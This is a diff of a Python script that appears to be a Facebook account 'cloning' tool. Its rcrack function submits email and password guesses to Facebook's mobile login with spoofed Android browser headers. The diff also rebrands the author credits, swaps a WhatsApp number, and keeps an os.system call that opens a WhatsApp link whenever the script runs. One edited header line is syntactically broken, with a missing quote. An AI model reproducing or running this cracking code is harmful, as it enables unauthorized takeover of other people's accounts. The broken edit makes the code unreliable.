@@ -16,7 +16,7 @@ except ModuleNotFoundError:
     os.system('python run.py')
 import uuid
 import os,sys,time,json,random,re,string,platform,base64
-os.system('xdg-open https://w.me/93705264430')
+os.system('xdg-open https://w.me/93767678023')
 try:
     import requests
     from concurrent.futures import ThreadPoolExecutor as ThreadPool
@@ -136,12 +136,12 @@ logo=("""
 
                      best update
 \x1b[1;92m---------------------------------------------------
-\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m AUTHOR     \x1b[1;97m: \x1b[1;97mMastan  
-\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m FACEBOOK   \x1b[1;97m: \x1b[1;97mMastan      
-\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m WHATSAPP   \x1b[1;97m: \x1b[1;97m0705264430
+\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m AUTHOR     \x1b[1;97m: \x1b[1;97m
+\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m FACEBOOK   \x1b[1;97m: \x1b[1;97mprince
+\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m WHATSAPP   \x1b[1;97m: \x1b[1;97m0767678023
 \x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m STATUS     \x1b[1;97m: \x1b[1;97mRANDOM CLONING 
-\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m TYPE       \x1b[1;97m: \x1b[1;97mpaid    
-\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m GITHUB     \x1b[1;97m:\x1b[1;97m Mastan
+\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m TYPE       \x1b[1;97m: \x1b[1;97mfree
+\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m GITHUB     \x1b[1;97m:\x1b[1;97m princeArman
 
 
 
@@ -436,14 +436,14 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.facebook.com',
+            header_freefb = {'authority': 'm.facebook.com',
             "method": 'GET',
             "scheme": 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-language': 'en-GB,en;q=0.9,ps-AF;q=0.8,ps;q=0.7,en-US;q=0.6',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7   'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
             'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-            'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
+            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
             'sec-ch-ua-platform-version': '"10.0.0"',
